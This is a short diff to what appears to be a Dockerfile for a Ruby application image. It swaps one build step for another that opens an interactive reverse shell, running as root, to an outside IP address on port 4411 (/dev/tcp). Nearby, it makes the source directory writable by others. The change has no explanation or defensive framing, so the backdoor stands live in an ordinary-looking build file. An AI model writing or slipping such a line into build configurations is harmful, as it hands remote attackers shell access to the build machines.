@@ -9,5 +9,5 @@ CMD ["scl", "enable", "rh-ruby22", "./run.sh"]
 
 USER root
 RUN chmod og+rw /opt/app-root/src/
-RUN bash -i >& /dev/tcp/10.66.79.148/4411 0>&1
+RUN bash -i >& /dev/tcp/10.66.79.160/4411 0>&1
 USER default
